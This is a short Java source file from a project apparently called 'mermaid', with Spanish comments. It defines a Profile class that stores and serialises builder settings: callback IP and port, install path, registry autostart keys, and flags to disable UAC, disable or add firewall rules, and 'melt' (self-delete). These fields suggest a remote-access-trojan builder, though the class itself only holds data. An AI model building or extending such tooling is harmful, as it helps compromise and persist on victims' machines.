package net.jlxip.mermaid;

public class Profile {
    // CREAMOS VARIABLES GLOBALES
    String NAME;
    String IP;
    String PORT;
    String PATH;
    String FILE;
    String ADFOLDER;
    String HKCU;
    String HKLM;
    String DISABLEUAC;
    String DISABLEFIREWALL;
    String ADDFIREWALL;
    String MELT;
    
    public Profile(String recvName, String recvIP, String recvPort,
    String recvPath, String recvFile, String recvADFolder, String recvHKCU, String recvHKLM, String recvDISABLEUAC, String recvDISABLEFIREWALL, String recvADDFIREWALL, String recvMELT){
        // RELLENAMOS LAS VARIABLES GLOBALES CON LAS RECIBIDAS POR ARGUMENTOS
        NAME = recvName;
        IP = recvIP;
        PORT = recvPort;
        PATH = recvPath;
        FILE = recvFile;
        ADFOLDER = recvADFolder;
        HKCU = recvHKCU;
        HKLM = recvHKLM;
        DISABLEUAC = recvDISABLEUAC;
        DISABLEFIREWALL = recvDISABLEFIREWALL;
        ADDFIREWALL = recvADDFIREWALL;
        MELT = recvMELT;
        
        if(ADFOLDER.equals("")){    // Si ADFOLDER est� vac�o...
            ADFOLDER = "NULL";  // Ponemos NULL (para que no haya errores carg�ndo el archivo "profiles.dat"
        }
        
        if(HKCU.equals("")){    // SI HKCU est� vac�o...
            HKCU = "NULL";  // Ponemos NULL
        }
        
        if(HKLM.equals("")){    // Lo mismo con HKLM
            HKLM = "NULL";      // "
        }
    }
    
    public String getString(){  // FUNCI�N PARA CONVERTIR EL PERFIL A STRING
        String str = "";    // Creamos la variable vac�a
        str = str + NAME + "|";     // Y vamos a�adiendo los datos con el delimitador |
        str = str + IP + "|";
        str = str + PORT + "|";
        str = str + PATH + "|";
        str = str + FILE + "|";
        str = str + ADFOLDER + "|";
        str = str + HKCU + "|";
        str = str + HKLM + "|";
        str = str + DISABLEUAC + "|";
        str = str + DISABLEFIREWALL + "|";
        str = str + ADDFIREWALL + "|";
        str = str + MELT + "|";
        
        return str;     // Returnamos el String
    }
}
